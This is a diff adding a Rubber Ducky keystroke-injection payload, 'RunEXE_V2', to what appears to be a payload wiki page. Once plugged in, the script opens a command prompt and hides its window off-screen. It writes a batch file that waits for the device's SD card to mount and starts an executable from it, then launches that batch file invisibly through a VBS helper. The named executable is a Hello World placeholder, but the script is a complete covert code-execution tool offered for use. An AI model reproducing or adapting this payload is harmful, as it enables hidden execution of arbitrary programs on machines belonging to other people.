@@ -83,3 +83,76 @@ echo Hello World!!! > Message.txt
 
 The encoders now support the repeat command, so should only be a problem if you are using an old encoder. Encoders also now support white space in the duck script, so functions have been separated with white space. 
 
+The following is a newer version of the RunEXE from SD payload which uses googleknowsbest's method for finding the "DUCKY" drive, which is more portable than the previous version's method. This version should work on all current Windows versions. Ex... XP, Vista, and Windows 7. 
+
+```
+REM Author: overwraith
+REM Name: RunEXE_V2.txt
+REM Purpose: Run an executable file off of the SD card after it mounts. Uses googleknowsbest's slightly more portable method to find the "Ducky" drive. 
+REM Encoder V2.4
+REM Using the run command for a broader OS base. 
+DEFAULT_DELAY 75
+DELAY 3000
+GUI R
+DELAY 1000
+STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
+DELAY 500
+ENTER
+DELAY 750
+ALT SPACE
+STRING M
+DOWNARROW
+REPEAT 100
+ENTER
+
+REM Change directories because System32 appears to be protected. 
+STRING CD %TEMP%
+ENTER
+
+REM Make batch file that waits for SD card to mount. 
+REM Delete batch file if already exists
+STRING erase /Q DuckyWait.bat
+ENTER
+STRING copy con DuckyWait.bat
+ENTER
+REM DuckyWait.bat
+STRING :while1
+ENTER
+STRING for /f "tokens=3 delims= " %%A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (set DUCKYdrive=%%A:)
+ENTER
+STRING if Exist %DUCKYdrive% (
+ENTER
+STRING goto :break
+ENTER
+STRING )
+ENTER
+STRING timeout /t 30
+ENTER
+STRING goto :while1
+ENTER
+STRING :break
+ENTER
+REM Continue script.
+STRING START %DUCKYdrive%\HelloWorld.exe
+ENTER
+CONTROL z
+ENTER
+
+REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.
+REM Delete vbs file if already exists
+STRING erase /Q invis.vbs
+ENTER
+REM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up
+STRING copy con invis.vbs
+ENTER
+STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
+ENTER
+CONTROL Z
+ENTER
+
+REM RUN THE BATCH FILE
+STRING wscript.exe invis.vbs DuckyWait.bat
+ENTER
+REM STRING EXIT
+REM ENTER
+```
